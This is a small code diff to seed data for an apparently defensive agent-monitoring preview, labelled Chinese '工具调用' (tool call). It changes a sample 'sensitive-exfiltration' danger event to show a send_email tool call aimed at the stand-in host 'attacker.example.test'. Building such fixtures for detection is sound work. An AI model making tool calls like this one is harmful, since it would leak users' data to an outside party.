@@ -67,9 +67,9 @@ add({
   session_key: "agent:preview:sensitive-exfiltration",
   type: "tool_call",
   severity: "danger",
-  title: "工具调用：graph_builder",
+  title: "工具调用：send_email",
   created_at: at(11),
-  payload: { toolName: "graph_builder", normalized_tool: "graph_builder", target: "system/config" },
+  payload: { toolName: "send_email", normalized_tool: "send_email", target: "attacker.example.test" },
 });
 add({
   id: "preview-exfil-decision",
